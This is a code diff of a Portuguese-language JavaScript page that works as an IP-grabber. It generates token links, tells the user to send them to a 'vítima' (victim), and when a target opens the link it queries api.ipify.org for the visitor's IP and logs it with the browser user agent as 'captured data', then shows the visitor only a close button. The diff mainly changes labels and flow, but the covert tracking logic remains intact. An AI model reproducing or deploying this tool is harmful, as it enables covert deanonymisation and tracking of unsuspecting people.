@@ -315,7 +315,7 @@ function generateLink() {
   const div = document.createElement('div');
   div.innerHTML = `
     <strong>Link:</strong> <a href="${link}" target="_blank">${link}</a><br>
-    <button onclick="copyLink('${link}', this)">Compartilhar Link</button>
+    <button onclick="copyLink('${link}', this)">Copiar Link</button>
     <button onclick="showCapturedData('${token}')">Mostrar Dados Capturados</button>
     <div id="data-${token}" style="margin-top: 5px; font-size: 0.9rem;"></div>
     <hr>
@@ -323,23 +323,13 @@ function generateLink() {
   container.appendChild(div);
 }
 
-// Função copiar link e mostrar mensagens
+// Copiar link e mostrar mensagens
 function copyLink(link, btn) {
   navigator.clipboard.writeText(link).then(() => {
-    const originalText = btn.textContent;
-    btn.textContent = 'Link copiado! Envie para sua vítima...';
-    btn.disabled = true;
-
+    btn.textContent = 'Link copiado! Envie para sua vítima.';
     setTimeout(() => {
-      btn.textContent = 'Vitima conectada!';
+      btn.textContent = 'Vítima conectada';
     }, 3000);
-    
-    setTimeout(() => {
-      btn.textContent = originalText;
-      btn.disabled = false;
-    }, 6000);
-  }).catch(() => {
-    alert('Erro ao copiar o link');
   });
 }
 
@@ -458,36 +448,32 @@ window.addEventListener('load', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const token = urlParams.get('token');
 
-  if (token) {
+  if (token && captureData[token]) {
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
-        if (!captureData[token]) captureData[token] = { ips: [], userAgents: [] };
         captureData[token].ips.push(data.ip);
         captureData[token].userAgents.push(navigator.userAgent);
 
-        // Mostra só o botão fechar, nada mais
+        // Mostra só botão fechar, sem dados
         document.body.innerHTML = `
-          <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;">
-            <button 
+          <div style="text-align:center; margin-top:40vh; color:#00ff99; font-family: monospace;">
+            <h2>Vítima Conectada</h2>
+            <button
               style="padding:20px 40px; font-size:1.5rem; background:#00ff99; border:none; border-radius:8px; cursor:pointer; font-family: monospace;"
-              onclick="window.close()"
+              onclick="
+                window.close();
+                setTimeout(() => {
+                  document.body.innerHTML = '<h2 style=\\'color:#00ff99; font-family: monospace; text-align:center; margin-top:40vh;\\'>Feche esta aba manualmente.</h2>';
+                }, 500);
+              "
             >FECHAR</button>
           </div>
         `;
       })
       .catch(() => {
-        document.body.innerHTML = `
-          <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000; color:#f00; font-family: monospace;">
-            Erro ao capturar dados.
-            <button 
-              style="margin-left:20px; padding:15px 30px; font-size:1.2rem; background:#00ff99; border:none; border-radius:6px; cursor:pointer;"
-              onclick="window.close()"
-            >FECHAR</button>
-          </div>
-        `;
+        document.body.innerHTML = `<p style="color:#ff4444; font-family: monospace; text-align:center; margin-top:40vh;">Erro ao capturar IP.</p>`;
       });
-    return; // impede carregar app normal para token
   }
 });
 </script>
